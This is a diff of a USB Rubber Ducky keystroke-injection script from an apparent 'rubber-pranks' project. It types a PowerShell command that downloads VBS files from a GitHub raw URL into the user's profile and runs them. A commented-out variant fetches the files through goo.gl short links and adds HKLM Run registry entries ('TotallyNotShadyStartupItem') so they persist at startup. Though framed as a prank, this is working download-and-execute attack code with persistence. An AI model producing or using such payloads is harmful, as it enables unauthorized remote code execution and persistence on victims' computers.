@@ -18,9 +18,9 @@ REM DELAY 500
 REM ALT y
 
 DELAY 600
-STRING powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/karimodm/rubber-pranks/master/volup.vbs','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/karimodm/rubber-pranks/master/cena.vbs','%userprofile%\cena.vbs'); && start %userprofile%\cena.vbs && exit
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/karimodm/rubber-pranks/master/volup_cena.vbs','%userprofile%\volup_cena.vbs'); && start %userprofile%\volup_cena.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/karimodm/rubber-pranks/master/cena.vbs','%userprofile%\cena.vbs'); && start %userprofile%\cena.vbs && exit
 
-REM powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\cena.vbs'); && start %userprofile%\cena.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\cena.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\volup.vbs && exit
+REM powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\cena.vbs'); && start %userprofile%\cena.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\cena.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\volup_cena.vbs'); && start %userprofile%\volup_cena.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\volup_cena.vbs && exit
 DELAY 200
 ENTER
 DELAY 200
